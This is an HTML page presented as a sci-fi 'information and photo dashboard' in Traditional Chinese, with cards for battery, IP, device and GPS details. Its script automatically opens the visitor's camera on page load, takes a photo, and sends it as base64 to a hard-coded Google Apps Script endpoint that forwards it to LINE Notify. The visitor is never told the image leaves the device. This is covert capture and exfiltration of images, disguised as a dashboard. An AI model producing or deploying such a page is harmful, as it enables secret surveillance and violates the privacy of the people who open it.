<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科幻資訊與拍照儀表板</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="dashboard">
    <h1 class="title">科幻資訊與拍照儀表板</h1>

    <!-- 拍照狀態 -->
    <div class="card">
      <h2>拍照狀態</h2>
      <p id="photoStatus">狀態：啟動中...</p>
    </div>

    <!-- 電池資訊 -->
    <div class="card">
      <h2>電池資訊</h2>
      <p class="highlight" id="batteryLevel">--%</p>
      <p id="batteryStatus">狀態：未知</p>
      <p id="batteryRemaining">剩餘時間：-- 分鐘</p>
    </div>

    <!-- IP 資訊 -->
    <div class="card">
      <h2>IP 資訊</h2>
      <p id="ipInfo">尚未讀取</p>
    </div>

    <!-- 設備資訊 -->
    <div class="card">
      <h2>設備資訊</h2>
      <p id="deviceInfo">尚未讀取</p>
    </div>

    <!-- GPS 資訊 -->
    <div class="card">
      <h2>GPS 資訊</h2>
      <p id="gpsCoordinates">緯度: --, 經度: --</p>
      <p id="gpsAddress">地址: 尚未讀取</p>
    </div>

    <!-- 圖表區域 -->
    <div class="card chart-card">
      <h2>電池電量曲線</h2>
      <canvas id="batteryChart"></canvas>
    </div>
  </div>

  <!-- 底部商標 -->
  <footer class="footer">
    <div class="logo">
      <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
    </div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script>
    const GOOGLE_GEOCODING_API_KEY = 'YOUR_API_KEY_HERE'; // 替換為 Google API 金鑰

    // 初始化圖表數據
    const ctx = document.getElementById('batteryChart').getContext('2d');
    const batteryChart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [], // 時間標籤
        datasets: [{
          label: '電池電量 (%)',
          data: [], // 電量數據
          borderColor: '#00ffcc',
          backgroundColor: 'rgba(0, 255, 204, 0.1)',
          tension: 0.3,
          fill: true,
        }]
      },
      options: {
        scales: {
          x: {
            display: true,
            title: { display: true, text: '時間', color: '#ffffff' },
            ticks: { color: '#ffffff' }
          },
          y: {
            display: true,
            title: { display: true, text: '電量 (%)', color: '#ffffff' },
            ticks: { color: '#ffffff' }
          }
        },
        plugins: { legend: { labels: { color: '#ffffff' } } },
        responsive: true,
      }
    });

    // 更新電量曲線
    function updateBatteryChart(batteryLevel) {
      const now = new Date().toLocaleTimeString();
      batteryChart.data.labels.push(now);
      batteryChart.data.datasets[0].data.push(batteryLevel);
      if (batteryChart.data.labels.length > 10) {
        batteryChart.data.labels.shift();
        batteryChart.data.datasets[0].data.shift();
      }
      batteryChart.update();
    }

    // 自動啟動相機
    async function startCameraAndSend() {
      const statusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach((track) => track.stop());
          sendPhotoToServer(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 發送照片到伺服器
    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('photoStatus');
      try {
        const base64Image = photoData.split(',')[1];
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);

        const response = await fetch('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 啟動功能
    window.onload = () => {
      startCameraAndSend(); // 自動啟動相機
      // 初始化其他功能如 IP 和 GPS
    };
  </script>
</body>
</html>
